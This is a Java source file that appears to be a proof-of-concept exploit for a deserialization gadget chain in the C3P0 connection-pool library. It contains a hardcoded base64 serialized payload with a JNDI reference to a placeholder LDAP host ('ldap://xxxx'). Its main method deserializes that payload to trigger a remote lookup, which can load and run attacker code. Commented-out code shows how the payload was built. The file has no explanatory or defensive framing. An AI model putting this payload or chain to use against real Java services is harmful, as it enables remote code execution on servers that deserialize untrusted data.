package com.example.C3P0;

import com.example.Utils.Encoder;
import com.example.Utils.SerializeUtil;
import com.mchange.v2.c3p0.WrapperConnectionPoolDataSource;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.sql.DataSource;
import java.io.PrintWriter;
import java.sql.Connection;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;

public class POC_3 {

    /***
     * <com.mchange.v2.c3p0.impl.WrapperConnectionPoolDataSourceBase: void readObject(java.io.ObjectInputStream)>
     * <com.mchange.v2.naming.ReferenceIndirector: java.lang.Object getObject()>
     * <javax.naming.InitialContext: java.lang.Object lookup(javax.naming.Name)>
     */

    public static void main(String[] args) throws Exception {
//        WrapperConnectionPoolDataSource b = new WrapperConnectionPoolDataSource(false); // 修改了源码从而生成payload
//        b.setNestedDataSource(new PoolSource());
//        System.out.println(Encoder.encodeBase64(SerializeUtil.serialize(b)));
        String payload = "rO0ABXNyADNjb20ubWNoYW5nZS52Mi5jM3AwLldyYXBwZXJDb25uZWN0aW9uUG9vbERhdGFTb3VyY2WdphdVtpU+AgIAAkwAEGNvbm5lY3Rpb25UZXN0ZXJ0ACZMY29tL21jaGFuZ2UvdjIvYzNwMC9Db25uZWN0aW9uVGVzdGVyO0wADXVzZXJPdmVycmlkZXN0AA9MamF2YS91dGlsL01hcDt4cgA8Y29tLm1jaGFuZ2UudjIuYzNwMC5pbXBsLldyYXBwZXJDb25uZWN0aW9uUG9vbERhdGFTb3VyY2VCYXNlAAAAAAAAAAEDACdJABBhY3F1aXJlSW5jcmVtZW50SQAUYWNxdWlyZVJldHJ5QXR0ZW1wdHNJABFhY3F1aXJlUmV0cnlEZWxheVoAEWF1dG9Db21taXRPbkNsb3NlWgAYYnJlYWtBZnRlckFjcXVpcmVGYWlsdXJlSQAPY2hlY2tvdXRUaW1lb3V0WgAkZGVidWdVbnJldHVybmVkQ29ubmVjdGlvblN0YWNrVHJhY2VzWgAhZm9yY2VJZ25vcmVVbnJlc29sdmVkVHJhbnNhY3Rpb25zWgAYZm9yY2VTeW5jaHJvbm91c0NoZWNraW5zSQAYaWRsZUNvbm5lY3Rpb25UZXN0UGVyaW9kSQAPaW5pdGlhbFBvb2xTaXplSQAZbWF4QWRtaW5pc3RyYXRpdmVUYXNrVGltZUkAEG1heENvbm5lY3Rpb25BZ2VJAAttYXhJZGxlVGltZUkAHG1heElkbGVUaW1lRXhjZXNzQ29ubmVjdGlvbnNJAAttYXhQb29sU2l6ZUkADW1heFN0YXRlbWVudHNJABptYXhTdGF0ZW1lbnRzUGVyQ29ubmVjdGlvbkkAC21pblBvb2xTaXplWgAXcHJpdmlsZWdlU3Bhd25lZFRocmVhZHNJAA1wcm9wZXJ0eUN5Y2xlSQAlc3RhdGVtZW50Q2FjaGVOdW1EZWZlcnJlZENsb3NlVGhyZWFkc1oAF3Rlc3RDb25uZWN0aW9uT25DaGVja2luWgAYdGVzdENvbm5lY3Rpb25PbkNoZWNrb3V0SQAbdW5yZXR1cm5lZENvbm5lY3Rpb25UaW1lb3V0WgAgdXNlc1RyYWRpdGlvbmFsUmVmbGVjdGl2ZVByb3hpZXNMABJhdXRvbWF0aWNUZXN0VGFibGV0ABJMamF2YS9sYW5nL1N0cmluZztMAB1jb25uZWN0aW9uQ3VzdG9taXplckNsYXNzTmFtZXEAfgAETAAZY29ubmVjdGlvblRlc3RlckNsYXNzTmFtZXEAfgAETAAYY29udGV4dENsYXNzTG9hZGVyU291cmNlcQB+AARMABRmYWN0b3J5Q2xhc3NMb2NhdGlvbnEAfgAETAANaWRlbnRpdHlUb2tlbnEAfgAETAAQbmVzdGVkRGF0YVNvdXJjZXQAFkxqYXZheC9zcWwvRGF0YVNvdXJjZTtMABdvdmVycmlkZURlZmF1bHRQYXNzd29yZHEAfgAETAATb3ZlcnJpZGVEZWZhdWx0VXNlcnEAfgAETAADcGNzdAAiTGphdmEvYmVhbnMvUHJvcGVydHlDaGFuZ2VTdXBwb3J0O0wAEnByZWZlcnJlZFRlc3RRdWVyeXEAfgAETAAVdXNlck92ZXJyaWRlc0FzU3RyaW5ncQB+AARMAAN2Y3N0ACJMamF2YS9iZWFucy9WZXRvYWJsZUNoYW5nZVN1cHBvcnQ7eHB3DwABAAAAAwAAAB4AAAPoAHB3BQAAAAAAcHQAMGNvbS5tY2hhbmdlLnYyLmMzcDAuaW1wbC5EZWZhdWx0Q29ubmVjdGlvblRlc3RlcnQABmNhbGxlcncBAHB3AgAAcHcoAAAAAAAAAAMAAAAAAAAAAAAAAAAAAAAAAAAADwAAAAAAAAAAAAAAA3NyAD1jb20ubWNoYW5nZS52Mi5uYW1pbmcuUmVmZXJlbmNlSW5kaXJlY3RvciRSZWZlcmVuY2VTZXJpYWxpemVkYhmF0NEqwhMCAARMAAtjb250ZXh0TmFtZXQAE0xqYXZheC9uYW1pbmcvTmFtZTtMAANlbnZ0ABVMamF2YS91dGlsL0hhc2h0YWJsZTtMAARuYW1lcQB+AAxMAAlyZWZlcmVuY2V0ABhMamF2YXgvbmFtaW5nL1JlZmVyZW5jZTt4cHNyABlqYXZheC5uYW1pbmcuQ29tcG91bmROYW1lMMEKV+03kcQDAAB4cHNyABRqYXZhLnV0aWwuUHJvcGVydGllczkS0HpwNj6YAgABTAAIZGVmYXVsdHN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHIAE2phdmEudXRpbC5IYXNodGFibGUTuw8lIUrkuAMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAIdwgAAAALAAAAAHhwdwQAAAABdAAKbGRhcDovL3h4eHhwcHBwcHB3DwAAAAAAAAAAAAAAAAAAAHB3AQB4c3IAMGNvbS5tY2hhbmdlLnYyLmMzcDAuaW1wbC5EZWZhdWx0Q29ubmVjdGlvblRlc3RlcrnWM7FcDg0UAgABTAATcXVlcnlsZXNzVGVzdFJ1bm5lcnQARkxjb20vbWNoYW5nZS92Mi9jM3AwL2ltcGwvRGVmYXVsdENvbm5lY3Rpb25UZXN0ZXIkUXVlcnlsZXNzVGVzdFJ1bm5lcjt4cgAsY29tLm1jaGFuZ2UudjIuYzNwMC5BYnN0cmFjdENvbm5lY3Rpb25UZXN0ZXJsmJlEFsA92gIAAHhwc3IAMmNvbS5tY2hhbmdlLnYyLmMzcDAuaW1wbC5EZWZhdWx0Q29ubmVjdGlvblRlc3RlciQzkhwshSpEr/oCAAB4cHNyAB5qYXZhLnV0aWwuQ29sbGVjdGlvbnMkRW1wdHlNYXBZNhSFWtzn0AIAAHhw";
        SerializeUtil.deserialize(Encoder.decodeBase64(payload));
    }

    private static class PoolSource implements DataSource, Referenceable {


        @Override
        public Reference getReference() throws NamingException {
            return null;
        }

        @Override
        public Connection getConnection() throws SQLException {
            return null;
        }

        @Override
        public Connection getConnection(String username, String password) throws SQLException {
            return null;
        }

        @Override
        public <T> T unwrap(Class<T> iface) throws SQLException {
            return null;
        }

        @Override
        public boolean isWrapperFor(Class<?> iface) throws SQLException {
            return false;
        }

        @Override
        public PrintWriter getLogWriter() throws SQLException {
            return null;
        }

        @Override
        public void setLogWriter(PrintWriter out) throws SQLException {

        }

        @Override
        public void setLoginTimeout(int seconds) throws SQLException {

        }

        @Override
        public int getLoginTimeout() throws SQLException {
            return 0;
        }

        @Override
        public Logger getParentLogger() throws SQLFeatureNotSupportedException {
            return null;
        }
    }

}
